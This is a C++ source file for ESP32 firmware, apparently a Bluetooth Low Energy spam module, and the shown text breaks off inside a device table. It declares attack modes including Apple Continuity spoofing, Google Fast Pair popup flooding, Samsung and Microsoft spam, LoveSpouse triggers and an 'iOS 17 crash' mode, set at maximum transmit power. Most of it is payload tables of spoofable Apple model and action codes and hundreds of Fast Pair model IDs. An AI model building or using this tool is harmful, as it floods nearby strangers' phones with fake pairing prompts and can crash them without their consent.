#include "ble_spam.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "globals.h"
#include "esp_mac.h"
#include "esp_random.h"
#include <string.h>

#if __has_include(<NimBLEExtAdvertising.h>)
#define NIMBLE_V2_PLUS 1
#endif

#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) ||                              \
    defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6) ||                            \
    defined(CONFIG_IDF_TARGET_ESP32C5)
#define MAX_TX_POWER ESP_PWR_LVL_P20
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9
#endif

#include <NimBLEDevice.h>
#include <NimBLEBeacon.h>

#if !defined(LITE_VERSION)
#include "apple_spam.h"
#endif
#include "core/sd_functions.h"

// ============================================================================
// Additional types and data (ported from legacy ble_spam implementation)
// ============================================================================
struct BLEData {
    BLEAdvertisementData AdvData;
    BLEAdvertisementData ScanData;
};

struct WatchModel {
    uint8_t value;
};

struct mac_addr {
    unsigned char bytes[6];
};

struct Station {
    uint8_t mac[6];
    bool selected;
};

enum EBLEPayloadType {
    Microsoft,
    SourApple,
    AppleJuice,
    Samsung,
    Google
};

// Shorthand AD types — subset of fastpair_models, kept for legacy code path
static const uint32_t android_models[] = {
    0x0001F0, 0x000047, 0x470000, 0x00000A, 0x00000B, 0x00000D, 0x000007, 0x090000,
    0x000048, 0x001000, 0x00B727, 0x01E5CE, 0x0200F0, 0x00F7D4, 0xF00002, 0xF00400,
    0x1E89A7, 0xCD8256, 0x0000F0, 0xF00000, 0x821F66, 0xF52494, 0x718FA4, 0x0002F0,
    0x92BBBD, 0x000006, 0x060000, 0xD446A7, 0x038B91, 0x02F637, 0x02D886, 0xF00000,
    0xF00001, 0xF00201, 0xF00209, 0xF00205, 0xF00305, 0xF00E97, 0x04ACFC, 0x04AA91,
    0x04AFB8, 0x05A963, 0x05AA91, 0x05C452, 0x05C95C, 0x0602F0, 0x0603F0, 0x1E8B18,
    0x1E955B, 0x06AE20, 0x06C197, 0x06C95C, 0x06D8FC, 0x0744B6, 0x07A41C, 0x07C95C,
    0x07F426, 0x054B2D, 0x0660D7, 0x0903F0, 0xD99CA1, 0x77FF67, 0xAA187F, 0xDCE9EA,
    0x87B25F, 0x1448C9, 0x13B39D, 0x7C6CDB, 0x005EF9, 0xE2106F, 0xB37A62, 0x92ADC9
};
static const int android_models_count = sizeof(android_models) / sizeof(android_models[0]);

static const WatchModel legacy_watch_models[26] = {
    {0x1A}, {0x01}, {0x02}, {0x03}, {0x04}, {0x05}, {0x06}, {0x07}, {0x08},
    {0x09}, {0x0A}, {0x0B}, {0x0C}, {0x11}, {0x12}, {0x13}, {0x14}, {0x15},
    {0x16}, {0x17}, {0x18}, {0x1B}, {0x1C}, {0x1D}, {0x1E}, {0x20}
};

static BLEAdvertising *pAdvertising = nullptr;

// ============================================================================
// Spam protocol types
// ============================================================================
enum SpamProtocol {
    SPAM_APPLE_CONTINUITY,
    SPAM_GOOGLE_FASTPAIR,
    SPAM_SAMSUNG,
    SPAM_MICROSOFT,
    SPAM_RANDOM,
    SPAM_CUSTOM,
    SPAM_SOURAPPLE,
    SPAM_APPLEJUICE,
    SPAM_LOVESPOUSE_PLAY,
    SPAM_LOVESPOUSE_STOP,
    SPAM_NAMEFLOOD,
    SPAM_IOS17_CRASH,
    SPAM_BLE_BEACON,
    SPAM_XIAOMI_QUICKCONNECT,
    SPAM_YANDEX,
};

// ============================================================================
// Apple Continuity — device models and action types
// Ported from ble_spam.c (Flipper Zero reference)
// ============================================================================
static const uint16_t continuity_pp_models[] = {
    0x0E20, 0x0A20, 0x0055, 0x0030, 0x0220, 0x0F20, 0x1320, 0x1420,
    0x1020, 0x0620, 0x0320, 0x0B20, 0x0C20, 0x1120, 0x0520, 0x0920,
    0x1720, 0x1220, 0x1620,
};

static const uint8_t continuity_na_actions[] = {
    0x13, 0x24, 0x05, 0x27, 0x20, 0x19, 0x1E, 0x09,
    0x2F, 0x02, 0x0B, 0x01, 0x06, 0x0D, 0x2B,
};

// ============================================================================
// Google Fast Pair — 3-byte model codes
// ============================================================================
static const uint32_t fastpair_models[] = {
    0x0001F0, 0x000047, 0x470000, 0x00000A, 0x0A0000, 0x00000B, 0x0B0000, 0x92ADC9,
    0x0C0000, 0x00000D, 0x000007, 0x070000, 0x000008, 0x080000, 0x000009,
    0x090000, 0x000035, 0x350000, 0x000048, 0x480000, 0x000049, 0x490000,
    0x001000, 0x00B727, 0x01E5CE, 0x0200F0, 0x00F7D4, 0xF00002, 0xF00400,
    0x1E89A7, 0x0577B1, 0x05A9BC, 0xCD8256, 0x0000F0, 0xF00000, 0x821F66,
    0xF52494, 0x718FA4, 0x0002F0, 0x92BBBD, 0x000006, 0x060000, 0xD446A7,
    0x2D7A23, 0x0E30C3, 0x72EF8D, 0x72FB00, 0x0003F0, 0x002000, 0x003000,
    0x003001, 0x00A168, 0x00AA48, 0x00AA91, 0x00C95C, 0x01EEB4, 0x02AA91,
    0x01C95C, 0x02D815, 0x035764, 0x038CC7, 0x02DD4F, 0x02E2A9, 0x035754,
    0x02C95C, 0x038B91, 0x02F637, 0x02D886, 0xF00001, 0xF00201, 0xF00204,
    0xF00209, 0xF00205, 0xF00200, 0xF00208, 0xF00207, 0xF00206, 0xF0020A,
    0xF0020B, 0xF0020C, 0xF00203, 0xF00202, 0xF00213, 0xF0020F, 0xF0020E,
    0xF00214, 0xF00212, 0xF0020D, 0xF00211, 0xF00215, 0xF00210, 0xF00305,
    0xF00304, 0xF00308, 0xF00303, 0xF00306, 0xF00300, 0xF00309, 0xF00302,
    0xF00307, 0xF00301, 0xF00E97, 0x04ACFC, 0x04AA91, 0x04AFB8, 0x05A963,
    0x05AA91, 0x05C452, 0x05C95C, 0x0602F0, 0x0603F0, 0x1E8B18, 0x1E955B,
    0x1EC95C, 0x1ED9F9, 0x1EE890, 0x1EEDF5, 0x1F1101, 0x1F181A, 0x1F2E13,
    0x1F4589, 0x1F4627, 0x1F5865, 0x1FBB50, 0x1FC95C, 0x1FE765, 0x1FF8FA,
    0x201C7C, 0x202B3D, 0x20330C, 0x003B41, 0x003D8A, 0x005BC3, 0x008F7D,
    0x00FA72, 0x0100F0, 0x011242, 0x013D8A, 0x01AA91, 0x038F16, 0x039F8F,
    0x03AA91, 0x03B716, 0x03C95C, 0x03C99C, 0x03F5D4, 0x045754, 0x045764,
    0x04C95C, 0x050F0C, 0x052CC7, 0x057802, 0x0582FD, 0x058D08, 0x06AE20,
    0x06C197, 0x06C95C, 0x06D8FC, 0x0744B6, 0x07A41C, 0x07C95C, 0x07F426,
    0x0102F0, 0x0202F0, 0x0302F0, 0x0402F0, 0x0502F0, 0x0702F0, 0x0802F0,
    0x054B2D, 0x0660D7, 0x0103F0, 0x0203F0, 0x0303F0, 0x0403F0, 0x0503F0,
    0x0703F0, 0x0803F0, 0x0903F0, 0x071C74, 0x0DC6BF, 0x0DC95C, 0x0DEC2B,
    0x0E138D, 0x0EC95C, 0x0ECE95, 0x0F0993, 0x0F1B8D, 0x0F232A, 0x0F2D16,
    0x20A19B, 0x20C95C, 0x20CC2C, 0x213C8C, 0x21521D, 0x21A04E, 0x5BA9B5,
    0x5BACD6, 0x5BD6C9, 0x5BE3D4, 0x5C0206, 0x5C0C84, 0x5C4833, 0x5C4A7E,
    0x5C55E7, 0x5C7CDC, 0x5C8AA5, 0x5CC900, 0x5CC901, 0x5CC902, 0x5CC903,
    0x5CC904, 0x5CC905, 0x5CC906, 0x5CC907, 0x5CC908, 0x5CC909, 0x5CC90A,
    0x5CC90B, 0x5CC90C, 0x5CC90D, 0x5CC90E, 0x5CC90F, 0x5CC910, 0x5CC911,
    0x5CC912, 0x5CC913, 0x5CC914, 0x5CC915, 0x5CC916, 0x5CC917, 0x5CC918,
    0x5CC919, 0x5CC91A, 0x5CC91B, 0x5CC91C, 0x5CC91D, 0x5CC91E, 0x5CC91F,
    0x5CC920, 0x5CC921, 0x5CC922, 0x5CC923, 0x5CC924, 0x5CC925, 0x5CC926,
    0x5CC927, 0x5CC928, 0x5CC929, 0x5CC92A, 0x5CC92B, 0x5CC92C, 0x5CC92D,
    0x5CC92E, 0x5CC92F, 0x5CC930, 0x5CC931, 0x5CC932, 0x5CC933, 0x5CC934,
    0x5CC935, 0x5CC936, 0x5CC937, 0x5CC938, 0x5CC939, 0x5CC93A, 0x5CC93B,
    0x5CC93C, 0x5CC93D, 0x5CC93E, 0x5CC93F, 0x5CC940, 0x5CC941, 0x5CC942,
    0x5CC943, 0x5CC944, 0x5CC945, 0x5CEE3C, 0x6AD226, 0x6B1C64, 0x6B8C65,
    0x6B9304, 0x6BA5C3, 0x6C42C0, 0x6C4DE5, 0x89BAD5, 0x8A31B7, 0x8A3D00,
    0x8A3D01, 0x8A8F23, 0x8AADAE, 0x8B0A91, 0x8B5A7B, 0x8BB0A0, 0x8BF79A,
    0x8C07D2, 0x8C1706, 0x8C4236, 0x8C6B6A, 0x8CAD81, 0x8CB05C, 0x8CD10F,
    0x8D13B9, 0x8D16EA, 0x8D5B67, 0x8E14D7, 0x8E1996, 0x8E4666, 0x8E5550,
    0x9101F0, 0x9128CB, 0x913B0C, 0x915CFA, 0x9171BE, 0x917E46, 0x91AA00,
    0x91AA01, 0x91AA02, 0x91AA03, 0x91AA04, 0x91AA05, 0x91BD38, 0x91C813,
    0x91DABC, 0x92255E, 0x989D0A, 0x9939BC, 0x994374, 0x997B4A, 0x99C87B,
    0x99D7EA, 0x99F098, 0x9A408A, 0x9A9BDD, 0x9AEEA4, 0x9B7339, 0x9B735A,
    0x9B9872, 0x9BC64D, 0x9BE931, 0x9C0AF7, 0x9C3997, 0x9C4058, 0x9C6BC0,
    0x9C888B, 0x9C98DB, 0x9CA277, 0x9CB5F3, 0x9CB881, 0x9CD0F3, 0x9CE3C7,
    0x9CEFD1, 0x9CF08F, 0x9D00A6, 0x9D7D42, 0x9DB896, 0xA7E52B, 0xA7EF76,
    0xA8001A, 0xA83C10, 0xA8658F, 0xA8845A, 0xA88B69, 0xA8A00E, 0xA8A72A,
    0xA8C636, 0xA8CAAD, 0xA8E353, 0xA8F96D, 0xA90358, 0xA92498, 0xA9394A,
    0xC6936A, 0xC69AFD, 0xC6ABEA, 0xC6EC5F, 0xC7736C, 0xC79B91, 0xC7A267,
    0xC7D620, 0xC7FBCC, 0xC8162A, 0xC85D7A, 0xC8777E, 0xC878AA, 0xC8C641,
    0xC8D335, 0xC8E228, 0xC9186B, 0xC9836A, 0xCA7030, 0xCAB6B8, 0xCAF511,
    0xCB093B, 0xCB529D, 0xCC438E, 0xCC5F29, 0xCC754F, 0xCC93A5, 0xCCBB7E,
    0xD5A59E, 0xD5B5F7, 0xD5C6CE, 0xD654CD, 0xD65F4E, 0xD69B2B, 0xD6C195,
    0xD6E870, 0xD6EE84, 0xD7102F, 0xD7E3EB, 0xD8058C, 0xD820EA, 0xD87A3E,
    0xD8F3BA, 0xD8F4E8, 0xD90617, 0xD933A7, 0xD9414F, 0xD97EBA, 0xD9964B,
    0xDA0F83, 0xDA4577, 0xDA5200, 0xDAD3A6, 0xDADE43, 0xDAE096, 0xDB8AC7,
    0xDBE5B1, 0xDC5249, 0xDCF33C, 0xDD4EC0, 0xDE215D, 0xDE577F, 0xDEC04C,
    0xDEDD6F, 0xDEE8C0, 0xDEEA86, 0xDEF234, 0xDF01E3, 0xDF271C, 0xDF42DE,
    0xDF4B02, 0xDF9BA4, 0xDFD433, 0xE020C1, 0xE06116, 0xE07634, 0xE09172,
    0xE4E457, 0xE5440B, 0xE57363, 0xE57B57, 0xE5B4B0, 0xE5B91B, 0xE5E2E9,
    0xE64613, 0xE64CC6, 0xE69877, 0xE6E37E, 0xE6E771, 0xE6E8B8, 0xE750CE,
    0x109201, 0x126644, 0x284500, 0x532011, 0x549547, 0x567679, 0x575836,
    0x596007, 0x612907, 0x614199, 0x625740, 0x641372, 0x641630, 0x664454,
    0x706908, 0x837980, 0x855347, 0x861698, 0xCB2FE7, 0x73A6F2, 0xD99CA1,
    0x77FF67, 0xAA187F, 0xDCE9EA, 0x87B25F, 0xF38C02, 0x1448C9, 0x13B39D,
    0xAA1FE1, 0x7C6CDB, 0x005EF9, 0xE2106F, 0xB37A62,
     0xD5AB33, 0x0C0B67, 0x0052DA, 0x124366,
    0xDA9B43, 0xE6B2D4, 0x9B4B6A, 0xA7C128,
    0xB8D241, 0xC9E352, 0xF1A234, 0xD2B345,
};

// Fast Pair device selection database
struct FastPairSelectEntry {
    uint32_t modelId;
    const char* name;
    const char* brand;
};

static const FastPairSelectEntry fastpair_select_list[] = {
    {0x0001F0, "Bisto CSR8670 Dev Board", "Google"},
    {0x000047, "Arduino 101", "Google"},
    {0x470000, "Arduino 101 2", "Google"},
    {0x00000A, "Anti-Spoof Test", "Other"},
    {0x0A0000, "Anti-Spoof Test 2", "Other"},
    {0x00000B, "Google Gphones", "Google"},
    {0x0B0000, "Google Gphones 2", "Google"},
    {0x0C0000, "Google Gphones 3", "Google"},
    {0x00000D, "Test 00000D", "Other"},
    {0x000007, "Android Auto", "Google"},
    {0x070000, "Android Auto 2", "Google"},
    {0x000008, "Foocorp Foophones", "Google"},
    {0x080000, "Foocorp Foophones 2", "Google"},
    {0x000009, "Test Android TV", "Google"},
    {0x090000, "Test Android TV 2", "Google"},
    {0x000035, "Test 000035", "Other"},
    {0x350000, "Test 000035 2", "Other"},
    {0x000048, "Fast Pair Headphones", "Google"},
    {0x480000, "Fast Pair Headphones 2", "Google"},
    {0x000049, "Fast Pair Headphones 3", "Google"},
    {0x490000, "Fast Pair Headphones 4", "Google"},
    {0x001000, "LG HBS1110", "LG"},
    {0x00B727, "Smart Controller 1", "Other"},
    {0x01E5CE, "BLE-Phone", "Other"},
    {0x0200F0, "Goodyear", "Goodyear"},
    {0x00F7D4, "Smart Setup", "Other"},
    {0xF00002, "Goodyear", "Goodyear"},
    {0xF00400, "T10", "Other"},
    {0x1E89A7, "ATS2833_EVB", "Other"},
    {0x00000C, "Google Gphones Transfer", "Google"},
    {0x0577B1, "Galaxy S23 Ultra", "Samsung"},
    {0x05A9BC, "Galaxy S20+", "Samsung"},
    {0xCD8256, "Bose NC 700", "Bose"},
    {0x0000F0, "Bose QuietComfort 35 II", "Bose"},
    {0xF00000, "Bose QuietComfort 35 II 2", "Bose"},
    {0x821F66, "JBL Flip 6", "JBL"},
    {0xF52494, "JBL Buds Pro", "JBL"},
    {0x718FA4, "JBL Live 300TWS", "JBL"},
    {0x0002F0, "JBL Everest 110GA", "JBL"},
    {0x92BBBD, "Pixel Buds", "Google"},
    {0x000006, "Google Pixel buds", "Google"},
    {0x060000, "Google Pixel buds 2", "Google"},
    {0xD446A7, "Sony XM5", "Sony"},
    {0x2D7A23, "Sony WF-1000XM4", "Sony"},
    {0x0E30C3, "Razer Hammerhead TWS", "Razer"},
    {0x72EF8D, "Razer Hammerhead TWS X", "Razer"},
    {0x72FB00, "Soundcore Spirit Pro GVA", "Soundcore"},
    {0x0003F0, "LG HBS-835S", "LG"},
    {0x002000, "AIAIAI TMA-2 (H60)", "Other"},
    {0x003000, "Libratone Q Adapt On-Ear", "Libratone"},
    {0x003001, "Libratone Q Adapt On-Ear 2", "Libratone"},
    {0x00A168, "boAt Airdopes 621", "boAt"},
    {0x00AA48, "Jabra Elite 2", "Jabra"},
    {0x00AA91, "Beoplay E8 2.0", "B&O"},
    {0x00C95C, "Sony WF-1000X", "Sony"},
    {0x01EEB4, "WH-1000XM4", "Sony"},
    {0x02AA91, "B&O Earset", "B&O"},
    {0x01C95C, "Sony WF-1000X", "Sony"},
    {0x02D815, "ATH-CK1TW", "Audio-Technica"},
    {0x035764, "PLT V8200 Series", "Plantronics"},
    {0x038CC7, "JBL TUNE760NC", "JBL"},
    {0x02DD4F, "JBL TUNE770NC", "JBL"},
    {0x02E2A9, "TCL MOVEAUDIO S200", "TCL"},
    {0x035754, "Plantronics PLT_K2", "Plantronics"},
    {0x02C95C, "Sony WH-1000XM2", "Sony"},
    {0x038B91, "DENON AH-C830NCW", "Denon"},
    {0x02F637, "JBL LIVE FLEX", "JBL"},
    {0x02D886, "JBL REFLECT MINI NC", "JBL"},
    {0xF00001, "Bose QuietComfort 35 II", "Bose"},
    {0xF00201, "JBL Everest 110GA", "JBL"},
    {0xF00204, "JBL Everest 310GA", "JBL"},
    {0xF00209, "JBL LIVE400BT", "JBL"},
    {0xF00205, "JBL Everest 310GA", "JBL"},
    {0xF00200, "JBL Everest 110GA", "JBL"},
    {0xF00208, "JBL Everest 710GA", "JBL"},
    {0xF00207, "JBL Everest 710GA", "JBL"},
    {0xF00206, "JBL Everest 310GA", "JBL"},
    {0xF0020A, "JBL LIVE400BT", "JBL"},
    {0xF0020B, "JBL LIVE400BT", "JBL"},
    {0xF0020C, "JBL LIVE400BT", "JBL"},
    {0xF00203, "JBL Everest 310GA", "JBL"},
    {0xF00202, "JBL Everest 110GA", "JBL"},
    {0xF00213, "JBL LIVE650BTNC", "JBL"},
    {0xF0020F, "JBL LIVE500BT", "JBL"},
    {0xF0020E, "JBL LIVE500BT", "JBL"},
    {0xF00214, "JBL LIVE650BTNC", "JBL"},
    {0xF00212, "JBL LIVE500BT", "JBL"},
    {0xF0020D, "JBL LIVE400BT", "JBL"},
    {0xF00211, "JBL LIVE500BT", "JBL"},
    {0xF00215, "JBL LIVE650BTNC", "JBL"},
    {0xF00210, "JBL LIVE500BT", "JBL"},
    {0xF00305, "LG HBS-1500", "LG"},
    {0xF00304, "LG HBS-1010", "LG"},
    {0xF00308, "LG HBS-1125", "LG"},
    {0xF00303, "LG HBS-930", "LG"},
    {0xF00306, "LG HBS-1700", "LG"},
    {0xF00300, "LG HBS-835S", "LG"},
    {0xF00309, "LG HBS-2000", "LG"},
    {0xF00302, "LG HBS-830", "LG"},
    {0xF00307, "LG HBS-1120", "LG"},
    {0xF00301, "LG HBS-835", "LG"},
    {0xF00E97, "JBL VIBE BEAM", "JBL"},
    {0x04ACFC, "JBL WAVE BEAM", "JBL"},
    {0x04AA91, "Beoplay H4", "B&O"},
    {0x04AFB8, "JBL TUNE 720BT", "JBL"},
    {0x05A963, "WONDERBOOM 3", "Other"},
    {0x05AA91, "B&O Beoplay E6", "B&O"},
    {0x05C452, "JBL LIVE220BT", "JBL"},
    {0x05C95C, "Sony WI-1000X", "Sony"},
    {0x0602F0, "JBL Everest 310GA", "JBL"},
    {0x0603F0, "LG HBS-1700", "LG"},
    {0x1E8B18, "SRS-XB43", "Sony"},
    {0x1E955B, "WI-1000XM2", "Sony"},
    {0x1EC95C, "Sony WF-SP700N", "Sony"},
    {0x1ED9F9, "JBL WAVE FLEX", "JBL"},
    {0x1EE890, "ATH-CKS30TW WH", "Audio-Technica"},
    {0x1EEDF5, "Teufel REAL BLUE TWS 3", "Teufel"},
    {0x1F1101, "TAG Heuer Calibre E4 45mm", "TAG Heuer"},
    {0x1F181A, "LinkBuds S", "Sony"},
    {0x1F2E13, "Jabra Elite 2", "Jabra"},
    {0x1F4589, "Jabra Elite 2", "Jabra"},
    {0x1F4627, "SRS-XG300", "Sony"},
    {0x1F5865, "boAt Airdopes 441", "boAt"},
    {0x1FBB50, "WF-C700N", "Sony"},
    {0x1FC95C, "Sony WF-SP700N", "Sony"},
    {0x1FE765, "TONE-TF7Q", "LG"},
    {0x1FF8FA, "JBL REFLECT MINI NC", "JBL"},
    {0x201C7C, "SUMMIT", "Summit"},
    {0x202B3D, "Amazfit PowerBuds", "Other"},
    {0x20330C, "SRS-XB33", "Sony"},
    {0x003B41, "M&D MW65", "M&D"},
    {0x003D8A, "Cleer FLOW II", "Cleer"},
    {0x005BC3, "Panasonic RP-HD610N", "Panasonic"},
    {0x008F7D, "soundcore Glow Mini", "Soundcore"},
    {0x00FA72, "Pioneer SE-MS9BN", "Pioneer"},
    {0x0100F0, "Bose QuietComfort 35 II", "Bose"},
    {0x011242, "Nirvana Ion", "Nirvana"},
    {0x013D8A, "Cleer EDGE Voice", "Cleer"},
    {0x01AA91, "Beoplay H9 3rd Generation", "B&O"},
    {0x038F16, "Beats Studio Buds", "Beats"},
    {0x039F8F, "Michael Kors Darci 5e", "Michael Kors"},
    {0x03AA91, "B&O Beoplay H8i", "B&O"},
    {0x03B716, "YY2963", "Other"},
    {0x03C95C, "Sony WH-1000XM2", "Sony"},
    {0x03C99C, "MOTO BUDS 135", "Motorola"},
    {0x03F5D4, "Writing Account Key", "Other"},
    {0x045754, "Plantronics PLT_K2", "Plantronics"},
    {0x045764, "PLT V8200 Series", "Plantronics"},
    {0x04C95C, "Sony WI-1000X", "Sony"},
    {0x050F0C, "Major III Voice", "Marshall"},
    {0x052CC7, "MINOR III", "Marshall"},
    {0x057802, "TicWatch Pro 5", "TicWatch"},
    {0x0582FD, "Pixel Buds", "Google"},
    {0x058D08, "WH-1000XM4", "Sony"},
    {0x06AE20, "Galaxy S21 5G", "Samsung"},
    {0x06C197, "OPPO Enco Air3 Pro", "OPPO"},
    {0x06C95C, "Sony WH-1000XM2", "Sony"},
    {0x06D8FC, "soundcore Liberty 4 NC", "Soundcore"},
    {0x0744B6, "Technics EAH-AZ60M2", "Technics"},
    {0x07A41C, "WF-C700N", "Sony"},
    {0x07C95C, "Sony WH-1000XM2", "Sony"},
    {0x07F426, "Nest Hub Max", "Google"},
    {0x0102F0, "JBL Everest 110GA - Gun Metal", "JBL"},
    {0x0202F0, "JBL Everest 110GA - Silver", "JBL"},
    {0x0302F0, "JBL Everest 310GA - Brown", "JBL"},
    {0x0402F0, "JBL Everest 310GA - Gun Metal", "JBL"},
    {0x0502F0, "JBL Everest 310GA - Silver", "JBL"},
    {0x0702F0, "JBL Everest 710GA - Gun Metal", "JBL"},
    {0x0802F0, "JBL Everest 710GA - Silver", "JBL"},
    {0x054B2D, "JBL TUNE125TWS", "JBL"},
    {0x0660D7, "JBL LIVE770NC", "JBL"},
    {0x0103F0, "LG HBS-835", "LG"},
    {0x0203F0, "LG HBS-830", "LG"},
    {0x0303F0, "LG HBS-930", "LG"},
    {0x0403F0, "LG HBS-1010", "LG"},
    {0x0503F0, "LG HBS-1500", "LG"},
    {0x0703F0, "LG HBS-1120", "LG"},
    {0x0803F0, "LG HBS-1125", "LG"},
    {0x0903F0, "LG HBS-2000", "LG"},
    {0x071C74, "JBL Flip 6", "JBL"},
    {0x0DC6BF, "My Awesome Device II", "Other"},
    {0x0DC95C, "Sony WH-1000XM3", "Sony"},
    {0x0DEC2B, "Emporio Armani EA Connected", "Emporio Armani"},
    {0x0E138D, "WF-SP800N", "Sony"},
    {0x0EC95C, "Sony WI-C600N", "Sony"},
    {0x0ECE95, "Philips TAT3508", "Philips"},
    {0x0F0993, "COUMI TWS-834A", "COUMI"},
    {0x0F1B8D, "JBL VIBE BEAM", "JBL"},
    {0x0F232A, "JBL TUNE BUDS", "JBL"},
    {0x0F2D16, "WH-CH520", "Sony"},
    {0x20A19B, "WF-SP800N", "Sony"},
    {0x20C95C, "Sony WF-SP700N", "Sony"},
    {0x20CC2C, "SRS-XB43", "Sony"},
    {0x213C8C, "DIZO Wireless Power", "Dizo"},
    {0x21521D, "boAt Rockerz 355 (Green)", "boAt"},
    {0x21A04E, "oraimo FreePods Pro", "Oraimo"},
    {0x5BA9B5, "WF-SP800N", "Sony"},
    {0x5BACD6, "Bose QC Ultra Earbuds", "Bose"},
    {0x5BD6C9, "JBL TUNE225TWS", "JBL"},
    {0x5BE3D4, "JBL Flip 6", "JBL"},
    {0x5C0206, "UA | JBL TWS STREAK", "JBL"},
    {0x5C0C84, "JBL TUNE225TWS", "JBL"},
    {0x5C4833, "WH-CH720N", "Sony"},
    {0x5C4A7E, "LG HBS-XL7", "LG"},
    {0x5C55E7, "TCL MOVEAUDIO S200", "TCL"},
    {0x5C7CDC, "WH-1000XM5", "Sony"},
    {0x5C8AA5, "JBL LIVE220BT", "JBL"},
    {0x5CEE3C, "Fitbit Charge 4", "Fitbit"},
    {0x6AD226, "TicWatch Pro 3", "TicWatch"},
    {0x6B1C64, "Pixel Buds", "Google"},
    {0x6B8C65, "oraimo FreePods 4", "Oraimo"},
    {0x6B9304, "Nokia SB-101", "Nokia"},
    {0x6BA5C3, "Jabra Elite 4", "Jabra"},
    {0x6C42C0, "TWS05", "Other"},
    {0x6C4DE5, "JBL LIVE PRO 2 TWS", "JBL"},
    {0x89BAD5, "Galaxy A23 5G", "Samsung"},
    {0x8A31B7, "Bose QC Ultra Headphones", "Bose"},
    {0x8A3D00, "Cleer FLOW II", "Cleer"},
    {0x8A3D01, "Cleer EDGE Voice", "Cleer"},
    {0x8A8F23, "WF-1000XM5", "Sony"},
    {0x8AADAE, "JLab GO Work 2", "JLab"},
    {0x8B0A91, "Jabra Elite 5", "Jabra"},
    {0x8B5A7B, "TicWatch Pro 3 GPS", "TicWatch"},
    {0x8B66AB, "Pixel Buds A-Series", "Google"},
    {0x8BB0A0, "Nokia Solo Bud+", "Nokia"},
    {0x8BF79A, "Oladance Whisper E1", "Other"},
    {0x8C07D2, "Jabra Elite 4 Active", "Jabra"},
    {0x8C1706, "YY7861E", "Other"},
    {0x8C4236, "GLIDiC mameBuds", "GLIDiC"},
    {0x8C6B6A, "realme Buds Air 3S", "Realme"},
    {0x8CAD81, "KENWOOD WS-A1", "Kenwood"},
    {0x8CB05C, "JBL LIVE PRO+ TWS", "JBL"},
    {0x8CD10F, "realme Buds Air Pro", "Realme"},
    {0x8D13B9, "BLE-TWS", "Other"},
    {0x8D16EA, "Galaxy M14 5G", "Samsung"},
    {0x8E14D7, "LG-TONE-TFP8", "LG"},
    {0x8E1996, "Galaxy A24 5g", "Samsung"},
    {0x8E4666, "Oladance Wearable Stereo", "Other"},
    {0x8E5550, "boAt Airdopes 511v2", "boAt"},
    {0x9101F0, "Jabra Elite 2", "Jabra"},
    {0x9128CB, "TCL MOVEAUDIO Neo", "TCL"},
    {0x913B0C, "YH-E700B", "Other"},
    {0x915CFA, "Galaxy A14", "Samsung"},
    {0x9171BE, "Jabra Evolve2 65 Flex", "Jabra"},
    {0x917E46, "LinkBuds", "Sony"},
    {0x91AA00, "Beoplay E8 2.0", "B&O"},
    {0x91AA01, "Beoplay H9 3rd Generation", "B&O"},
    {0x91AA02, "B&O Earset", "B&O"},
    {0x91AA03, "B&O Beoplay H8i", "B&O"},
    {0x91AA04, "Beoplay H4", "B&O"},
    {0x91AA05, "B&O Beoplay E6", "B&O"},
    {0x91BD38, "LG HBS-FL7", "LG"},
    {0x91C813, "JBL TUNE770NC", "JBL"},
    {0x91DABC, "SRS-XB33", "Sony"},
    {0x92255E, "LG-TONE-FP6", "LG"},
    {0x989D0A, "Set up your new Pixel 2", "Google"},
    {0x9939BC, "ATH-SQ1TW", "Audio-Technica"},
    {0x994374, "EDIFIER W320TN", "Edifier"},
    {0x997B4A, "UA JBL True Wireless Flash X", "JBL"},
    {0x99C87B, "WH-H810 (h.ear)", "Sony"},
    {0x99D7EA, "oraimo OpenCirclet", "Oraimo"},
    {0x99F098, "Galaxy S22 Ultra", "Samsung"},
    {0x9A408A, "MOTO BUDS 065", "Motorola"},
    {0x9A9BDD, "WH-XB910N", "Sony"},
    {0x9ADB11, "Pixel Buds Pro", "Google"},
    {0x9AEEA4, "LG HBS-FN4", "LG"},
    {0x9B7339, "AKG N9 Hybrid", "AKG"},
    {0x9B735A, "JBL RFL FLOW PRO", "JBL"},
    {0x9B9872, "Hyundai", "Hyundai"},
    {0x9BC64D, "JBL TUNE225TWS", "JBL"},
    {0x9BE931, "WI-C100", "Sony"},
    {0x9C0AF7, "JBL VIBE BUDS", "JBL"},
    {0x9C3997, "ATH-M50xBT2", "Audio-Technica"},
    {0x9C4058, "JBL WAVE FLEX", "JBL"},
    {0x9C6BC0, "LinkBuds S", "Sony"},
    {0x9C888B, "WH-H910N (h.ear)", "Sony"},
    {0x9C98DB, "JBL TUNE225TWS", "JBL"},
    {0x9CA277, "YY2963", "Other"},
    {0x9CB5F3, "WH-1000XM5", "Sony"},
    {0x9CB881, "soundcore Motion 300", "Soundcore"},
    {0x9CD0F3, "LG HBS-TFN7", "LG"},
    {0x9CE3C7, "EDIFIER NeoBuds Pro 2", "Edifier"},
    {0x9CEFD1, "SRS-XG500", "Sony"},
    {0x9CF08F, "JLab Epic Air ANC", "JLab"},
    {0x9D00A6, "Urbanears Juno", "Urbanears"},
    {0x9D7D42, "Galaxy S20", "Samsung"},
    {0x9DB896, "Your BMW", "BMW"},
    {0xA7E52B, "Bose NC 700 Headphones", "Bose"},
    {0xA7EF76, "JBL CLUB PRO+ TWS", "JBL"},
    {0xA8001A, "JBL CLUB ONE", "JBL"},
    {0xA83C10, "adidas Z.N.E. 01", "Adidas"},
    {0xA8658F, "ROCKSTER GO", "Other"},
    {0xA8845A, "oraimo FreePods 4", "Oraimo"},
    {0xA88B69, "WF-SP800N", "Sony"},
    {0xA8A00E, "Nokia CB-201", "Nokia"},
    {0xA8A72A, "JBL LIVE670NC", "JBL"},
    {0xA8C636, "JBL TUNE660NC", "JBL"},
    {0xA8CAAD, "Galaxy F04", "Samsung"},
    {0xA8E353, "JBL TUNE BEAM", "JBL"},
    {0xA8F96D, "JBL ENDURANCE RUN 2 WIRELESS", "JBL"},
    {0xA90358, "JBL LIVE220BT", "JBL"},
    {0xA92498, "JBL WAVE BUDS", "JBL"},
    {0xA9394A, "JBL TUNE230NC TWS", "JBL"},
    {0xC6936A, "JBL LIVE PRO+ TWS", "JBL"},
    {0xC69AFD, "WF-H800 (h.ear)", "Sony"},
